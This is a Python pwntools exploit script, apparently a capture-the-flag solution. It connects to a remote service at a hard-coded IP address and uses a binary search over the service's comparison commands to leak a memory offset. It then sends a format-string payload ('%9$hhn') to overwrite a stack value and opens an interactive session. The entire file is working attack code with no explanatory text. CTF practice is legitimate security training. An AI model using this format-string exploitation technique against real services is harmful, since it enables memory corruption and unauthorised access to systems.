#!/usr/bin/python2.7
from pwn import *
import sys

def main():


    '''
    # Wait for debugger (gdb)
    p = process("./chall")
    pid = util.proc.pidof(p)[0]
    print("The pid is: " + str(pid))
    util.proc.wait_for_debugger(pid)
    '''

    p = remote("199.247.6.180", 10009)

    payload = "#!>@"

    p.send(payload + "\x00") # first check if rnd_ptr greater than buf or smaller;
    sleep(1)
    msg = p.recv() # get result
    print("[COMPARISON] " + msg)

    if ("RESULT 1" in msg):
        sign = "-"
    else:
        sign = "+"

    median = 262144
    guessed_offset = 262144
    payload = "!" + sign + str(guessed_offset) + "=@"

    for i in range(0, 45):

        # check for equality step
        p.send(payload + "\x00")

        sleep(1)

        msg = p.recv()
        print("[EQUALITY] " + msg)

        if ("RESULT 1" in msg):
            print("FOUND IT")
            print("Offset is %X", guessed_offset)
            break

        # binary search step
        payload = "!" + sign + str(guessed_offset) + ">@"
        p.send(payload + "\x00")

        sleep(1)

        msg = p.recv() # get result
        print("[COMPARISON] " + msg)

        median = median / 2
        if "RESULT 1" in msg:
            guessed_offset = guessed_offset + median
        else:
            guessed_offset = guessed_offset - median

        payload = "!" + sign + str(guessed_offset) + "=@"


    payload = "!" + sign + str(guessed_offset) + "#"
    p.send(payload + "\x00")

    sleep(1)

    get_addr_of_buf_null_on_stack_right = "!+31";

    padding_1 = " " * (9 - len(get_addr_of_buf_null_on_stack_right))

    write_to_addr_of_buf_null = "%9$hhn"

    padding_2 = " " * (31 - len(get_addr_of_buf_null_on_stack_right + write_to_addr_of_buf_null + padding_1))

    payload = get_addr_of_buf_null_on_stack_right + padding_1 + write_to_addr_of_buf_null + padding_2

    p.send(payload)

    msg = p.recv()
    print(msg)

    p.send("A" * 31)

    p.interactive()


if __name__ == "__main__":
    main()
